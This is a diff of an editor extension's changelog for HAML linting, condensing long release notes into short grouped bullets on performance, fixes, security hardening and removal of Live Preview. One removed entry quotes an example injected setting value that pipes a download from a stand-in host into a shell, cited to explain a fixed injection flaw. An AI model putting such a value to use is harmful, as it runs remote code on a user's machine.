@@ -2,26 +2,31 @@
 
 ## [Unreleased]
 
-- **Performance**: The extension now ships as a single minified bundle instead of dozens of separate files, so it loads faster and uses less memory at startup.
-- **Fix**: The `hamlAll.lintEnabled` setting is now honoured. Linting previously always ran even with the setting turned off; disabling it now clears existing diagnostics and stops linting, and toggling it re-evaluates open files immediately.
-- **Fix**: Diagnostics no longer flicker back to a stale state. When several lints of the same file overlapped (for example a save landing while a change-triggered lint was still running), a slow older response could overwrite the newer results; each response is now applied only if it is still the latest for that file.
-- **Performance**: Saving a file no longer lints it twice. A save lints immediately and now cancels the pending change-debounced lint instead of letting both run back to back.
-- **Performance**: Asset and image lookups no longer walk the disk on every keystroke. The asset completion provider and the image-preview CodeLens used to scan asset directories recursively (including a potentially huge `public/assets`) each time they ran — the CodeLens on every edit of the file. Both now share an in-memory index that is scanned once and refreshed only when asset files are added or removed, so typing in a large project stays responsive. Matching regexes that were being recompiled on each keystroke are now built once, the image CodeLens honours cancellation, and the "jump to controller" CodeLens caches the controller file by modification time instead of re-reading it on every refresh.
-- **Performance**: Activation no longer boots Ruby or Rails. The extension previously ran `bin/rails --version` (which can load Spring or part of the app and take several seconds) synchronously during startup to detect a Rails project, and probed `haml-lint --version` on the same blocking path — both froze the editor's extension host while they ran. Rails detection now checks whether the rails command exists on disk, and the haml-lint probe runs in the background, so activation is no longer delayed.
-- **Fix**: Formatting no longer double-corrects HAML on haml-lint 0.74.0+. Since 0.74.0 haml-lint applies safe autocorrect to its own linters, so the extension's built-in fixers now run only when haml-lint is older than 0.74.0; on newer versions formatting relies on haml-lint's native autocorrect.
-- **Remove**: The Live Preview feature (`HAML: Open Live Preview` command) has been removed. Rendering a HAML template executes the Ruby embedded in it, so previewing a `.haml` file from an untrusted repository could run arbitrary code; the webview also rendered the compiled HTML without a Content-Security-Policy. The feature is dropped rather than sandboxed.
-- **Security**: The linting server now only accepts a `.haml-lint.yml` located inside the workspace and requires a per-session token on every request. A haml-lint/RuboCop config can load Ruby via `require:`, so this stops another local process (or another user on a shared machine) from driving the loopback server or pointing it at an arbitrary config elsewhere on disk to run code.
-- **Security**: The `haml-lint` and Rails executable checks no longer run through a shell, so a value like `x; curl evil | sh` in the `hamlAll.linterExecutablePath` / `railsRoutes.railsCommand` settings can no longer inject shell commands. These two settings are now machine-scoped (they can only be set in your user settings, not by a workspace's `.vscode/settings.json`), and the extension declares limited support for untrusted workspaces so it stays in Restricted Mode until you trust the folder.
-- **Fix**: The linting server now selects its port by binding directly (retrying on conflict) instead of shelling out to `lsof`, which is unavailable on Windows and could prevent the server from starting.
-- **Fix**: Made linting-server startup more robust. A missing `ruby` executable now surfaces a clear error instead of crashing the extension host; benign Ruby/Bundler warnings on stderr no longer make startup fail with "Failed to start HAML Lint server"; the start-up handshake is parsed from complete output lines so it no longer times out when the output arrives in chunks; and a missing `haml_lint` gem that cannot be installed automatically (no network or permissions) now fails with a clear error instead of retrying the install forever while the server never starts.
-- **Fix**: Requests to the linting server now have a timeout and always release their socket, so a linting server that stops responding can no longer hang linting/formatting or leak connections.
-- **Fix**: The linting server now caps the size of a single request, so a client that streams data without ever sending a newline can no longer exhaust memory and crash the server; over-large requests are rejected with a "Request too large" error.
-- **Fix**: The linting server now applies a read timeout to each connection, so a slow or half-open connection can no longer stall the server and block every following lint/format request.
-- **Fix**: Opening a lone `.haml` file with no folder open no longer breaks activation. The extension previously assumed a workspace folder was always present, throwing on startup so that no providers or linting were registered.
-- **Fix**: Editing `config/routes.rb` now reloads the Rails routes again. The reload passed the `load` method without binding its receiver, so it threw and the route cache stayed stale until the extension restarted.
-- **Fix**: The Rails routes watcher is no longer registered twice on activation, so editing `config/routes.rb` reloads routes and shows the progress notification once instead of twice.
-- **Performance**: Linting while typing is now debounced (300ms), so it runs once after you pause instead of opening a new connection to the lint server on every keystroke.
-- **Fix (Windows)**: The lint server's working directory now uses the OS file-system path instead of a URI path, so it no longer receives an invalid `/C:/...` directory that prevented the server from starting on Windows.
+### Performance
+
+- Ships as a single minified bundle — faster startup and lower memory use.
+- Activation no longer runs Ruby or Rails to detect a Rails project, so the editor no longer freezes on startup.
+- Asset and image lookups use an in-memory index instead of scanning the disk on every keystroke.
+- Linting while typing is debounced (300ms), and saving a file no longer lints it twice.
+
+### Fixes
+
+- `hamlAll.lintEnabled` is now honoured — turning it off clears diagnostics and stops linting.
+- Overlapping lints no longer let a stale result overwrite newer diagnostics.
+- Formatting no longer double-corrects HAML on haml-lint 0.74.0+.
+- Editing `config/routes.rb` reloads Rails routes again, and only once.
+- Opening a lone `.haml` file with no folder open no longer breaks activation.
+- Linting server startup and requests are more robust: clearer errors, request timeouts, and no hangs or leaked connections.
+- Windows: the linting server now starts reliably.
+
+### Security
+
+- The linting server requires a per-session token and only accepts a `.haml-lint.yml` from inside the workspace.
+- Executable checks no longer run through a shell; `hamlAll.linterExecutablePath` and `railsRoutes.railsCommand` are user-scoped only, and the extension stays in Restricted Mode until you trust the folder.
+
+### Removed
+
+- Live Preview was removed: rendering a HAML template could execute arbitrary Ruby from an untrusted repository.
 
 ## [3.0.0] - 2026-07-04
 
